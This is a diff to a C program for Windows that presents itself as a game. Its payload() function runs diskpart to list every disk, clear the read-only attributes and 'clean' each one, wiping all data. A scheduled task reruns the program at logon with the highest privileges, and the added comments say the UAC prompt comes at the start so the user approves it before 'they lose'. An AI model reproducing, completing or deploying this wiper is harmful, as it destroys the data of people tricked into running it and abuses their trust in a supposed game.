@@ -4,7 +4,7 @@
 #include <time.h>
 #include <stdlib.h>
 
-// schedules the task for next user logon
+// schedules self on logon with highest priviliges 
 void task_sch() {
     char exepath[MAX_PATH]; //finding current executable
     char cmd[MAX_PATH + 256]; // buffer for the rest of the code
@@ -50,7 +50,13 @@ void game() {
 void safe() {
     system("schtasks /delete /tn \"game\" /f");
 }
-// detects every disk and clears them 
+
+//1. list all disks -> ld.txt
+//2. parce disk nums > lo.txt
+//3. clear all attriebutes so i can kill read-only files > cl.txt
+//4. exec diskpart with cmnds
+//5. rm temp files
+
 void payload() {
     // sorry the commands are gonna be hard ot decipher
     
@@ -60,6 +66,7 @@ void payload() {
                 "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
                 "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
                 0, SW_HIDE);*/
+    
     system(
         "cmd /c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
         "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
@@ -69,6 +76,8 @@ void payload() {
 }
 int main(int argc, char *argv[]){
     // so that on logon, the script only runs the payload
+    // i added flagging in the first place because i want the user to
+    //enter uac once at the start instead of after they lose
     if (argc > 1 && strcmp(argv[1], "payload") == 0) {
         payload();
         return 0;
